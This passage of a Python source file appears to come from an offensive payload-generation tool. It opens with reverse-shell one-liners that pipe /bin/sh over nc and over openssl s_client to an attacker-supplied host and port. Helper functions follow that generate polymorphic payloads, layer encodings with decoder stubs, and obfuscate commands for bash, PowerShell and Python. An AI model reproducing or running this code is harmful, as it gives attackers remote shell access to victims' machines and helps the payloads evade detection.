            lolbins["nc"] = f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {host} {port} >/tmp/f"
            lolbins["openssl"] = f"mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect {host}:{port} > /tmp/s; rm /tmp/s"

        return lolbins


# Convenience functions

def generate_payload(host: str, port: int, **kwargs) -> GeneratedPayload:
    """Quick payload generation."""
    config = PayloadConfig(
        host=host,
        port=port,
        **{k: v for k, v in kwargs.items() if k in PayloadConfig.__dataclass_fields__}
    )
    generator = PolymorphicGenerator()
    return generator.generate(config)


def encode_payload(
    payload: str,
    encodings: List[str],
    key: Optional[str] = None
) -> Tuple[str, str]:
    """
    Quick payload encoding.

    Args:
        payload: Raw payload string
        encodings: List of encoding types
        key: Optional encryption key

    Returns:
        Tuple of (encoded_payload, decoder_stub)
    """
    config = PayloadConfig(
        host="",
        port=0,
        encoding=[EncodingType(e) for e in encodings],
        encryption_key=key
    )
    generator = PolymorphicGenerator()

    # Apply encodings
    encoded = payload
    chain = []
    for enc in config.encoding:
        encoded, enc_type, _ = generator._apply_encoding(encoded, enc, config)
        chain.append(enc_type)

    decoder = generator._generate_decoder(chain, config, key)
    return encoded, decoder


def obfuscate_command(
    command: str,
    lang: str,
    level: int = 3
) -> str:
    """
    Obfuscate a command.

    Args:
        command: Command to obfuscate
        lang: Target language (bash, powershell, python)
        level: Obfuscation level 1-5

    Returns:
        Obfuscated command
    """
    config = PayloadConfig(
        host="",
        port=0,
        target_lang=TargetLang(lang),
        obfuscation_level=level
    )
    engine = ObfuscationEngine()
    return engine.obfuscate(command, config)
